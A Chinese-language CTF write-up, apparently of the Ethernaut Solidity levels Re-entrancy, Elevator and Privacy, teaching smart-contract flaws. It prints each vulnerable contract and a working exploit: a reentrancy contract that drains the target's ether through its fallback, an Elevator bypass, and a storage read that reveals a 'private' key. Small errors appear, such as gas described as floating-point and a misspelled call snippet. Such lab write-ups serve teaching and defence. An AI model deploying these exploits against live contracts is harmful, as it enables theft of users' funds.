# 10\. Re-entrancy
终于到了重入漏洞，著名的The DAO攻击中攻击者就利用了重入漏洞，造成了以太坊社区的一个硬分叉。
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
    contract Reentrance {
      using SafeMath for uint256;
      mapping(address => uint) public balances;
      function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
      }
      function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
      }
      function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
          (bool result,) = msg.sender.call{value:_amount}("");
          if(result) {
            _amount;
          }
          balances[msg.sender] -= _amount;
        }
      }
      receive() external payable {}
    }
注意这里使用了`call{value:xx}`的形式，`call`是`send`和`transfer`函数底层实现，也是用来转账的。与它们的区别在于，[参考链接](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/)
  * transfer:要求接收的智能合约中必须有一个`fallback`或者`receive`函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误：
    * 付款方合约的余额不足，小于所要发送的value
    * 接收方合约拒绝接收支付
  * send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。
  * call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下:
        (bool success, bytes memory data) = receivingAddress.call{value: 100}("");
将参数设置为空会触发接收合约的`fallback`函数，使用call同样也可以调用本合约内的函数，形式如下
        (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256("function_name(uint256)",args)));
这里设置的gas是 **浮点数类型** 的，其中`function_name`、`uint256`和`args`需要替换为实际函数名字、参数类型、参数值。
`send`和`transfer`有一个限制单笔交易的gas不能超过2300的约束，这个约束值是很低的，只能支持一个event的触发，做不了更多操作，因此当设置到一些高gas消耗的操作时，必须使用call函数，但由于call函数不限制操作的gas值，又会导致存在合约重入的问题。
回到本题，注意到`withdraw`函数中调用了一个空参数的`call`函数，我们可以编写一个特殊的合约，让接收函数的fallback函数重复调用目标合约的`withdraw`函数，这样合约就会不断给我们所编写的合约转账直至余额为0。具体代码如下
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract attack {
        address payable target;
        address payable public owner;
        uint amount = 1000000000000000 wei;
        constructor(address payable _addr) public payable {
            target=_addr;
            owner = msg.sender;
        }
        function step1() public payable{
            bool b;
            (b,)=target.call{value: amount}(abi.encodeWithSignature("donate(address)",address(this)));
            require(b,"step1 error");
        }
        function setp2() public payable {
            bool b;
            (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));
            require(b,"step2 error");
        }
        fallback () external payable{
            bool b;
            (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));
            require(b,"fallback error");
        }
        function mywithdraw() external payable{
            require(msg.sender==owner,'not you');
            msg.sender.transfer(address(this).balance);
        }
    }
可以看到，合约在初始创建的时候往里面存了`0.001
ether`，也就是`1000000000000000 wei`，这也是为什么上面代码中为这个数字,注意部署时需要存入`1000000000000000
wei`
部署后首先执行`step1`，执行后可以看到合约地址对应余额增大了，说明`donate`存款成功
执行`step2`，利用进入`fallback`函数的重入再次转账，可以看到余额数量变得很大，并且题目合约余额为0，说明攻击成功
# 11\. Elevator
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    interface Building {
      function isLastFloor(uint) external returns (bool);
    }
    contract Elevator {
      bool public top;
      uint public floor;
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        if (! building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }
这道题其漏洞其实跟solidity关系不大，有点像逻辑漏洞？
上述代码中，`Building`是一个接口，类似抽象类，而`isLastFloor`则类似一个抽象函数，这里`Building(msg.sender)`远程调用我们传入的合约，因此我们可以自己设计这个函数的具体内容。题目最终要求我们到达电梯顶层，也就是让`top=true`。但分析代码可知，如果要进入if分支，那么`building.isLastFloor(_floor)`必须返回false，而top又等于`building.isLastFloor(_floor)`，似乎top只能为false。注意到，判断和赋值这里是两次函数调用，它们的返回结果并不一定相同。如果我们设置`isLastFloor`为针对同一个变量的取反函数，那么第一次调用返回false，第二次调用返回true，即可满足题目条件，具体代码如下：
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    interface Elevator {
      function goTo(uint _floor) external;
    }
    contract Building {
        bool x=true;
        address target;
        Elevator elevator;
        function isLastFloor(uint) external returns (bool){
            x=!x;
            return x;
        }
        function exploit(address _addr) public{
            elevator= Elevator(_addr);
            elevator.goTo(2);
        }
    }
其中x是一个内部状态变量，初始值为`true`，因此第一次调用时返回false，第二次取反返回true，从而绕过题目判断。其他语言里如果判断函数是一个对相同变量的取反函数的话也会存在这种问题8。
# 12\. Privacy
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Privacy {
      bool public locked = true;
      uint256 public ID = block.timestamp;
      uint8 private flattening = 10;
      uint8 private denomination = 255;
      uint16 private awkwardness = uint16(now);
      bytes32[3] private data;
      constructor(bytes32[3] memory _data) public {
        data = _data;
      }
      function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
      }
      /*
        A bunch of super advanced solidity algorithms...
          ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
          .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
          *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
          `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
          ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
      */
    }
题目很简单，就是我们输入data数组第二个元素的前16个字节即可，考察的还是以太坊合约中状态变量的内存分布。使用`await
web3.eth.getStorageAt(instance,
5)`读取到数组`data[2]`的内容为`0x246a7e946b46f638611408e1608743c0e8fb1f95538dce4a1921213f0ce798c5`，注意bytes16是从高地址开始截取的，所以传入`await
contract.unlock('0x246a7e946b46f638611408e1608743c0')`即可
**具体内存模型** :本文中是一个静态数组，数组元素也是跟在前面的元素后面直接排列的，也就是下面这样的内存分布。
    =============================================
            unused          | locked                
    -----------------------------------------------------------------        slot 0
           31 bytes         | 1 byte 
    =============================================
        ID
    -----------------------------------------------------------------        slot 1
                    32 bytes
    =============================================
    unused  |awkwardness|denomination|flattening|
    -----------------------------------------------------------------     slot 2
    28 bytes|2 bytes    | 1 byte     | 1 byte
    =============================================
    data[0]
    -----------------------------------------------------------------        slot 3
    32 bytes
    =============================================
    data[1]
    -----------------------------------------------------------------        slot 4
    32 bytes
    =============================================
    data[2]
    -----------------------------------------------------------------        slot 5
    32 bytes
    =============================================
如果，如果定义是`bytes32[] private data`，也就是定义成一个动态数组的话，那么内存模型是这样的。
    =============================================
            unused          | locked                
    -----------------------------------------------------------------       slot 0
           31 bytes         | 1 byte 
    =============================================
        ID
    -----------------------------------------------------------------      slot 1
    32 bytes
    =============================================
    unused  |awkwardness|denomination|flattening
    -----------------------------------------------------------------    slot 2
    28 bytes|2 bytes          | 1 byte          | 1 byte
    =============================================
    data.length
    -----------------------------------------------------------------     slot 3
    32 bytes
    =============================================
    ......
    =============================================
    data[0]
    -----------------------------------------------------------------     slot keccak256(3)
    32 bytes
    =============================================
    data[1]
    -----------------------------------------------------------------       slot keccak256(3)+1
    32 bytes
    =============================================
    data[2]
    -----------------------------------------------------------------      slot keccak256(3)+2
    32 bytes
    =============================================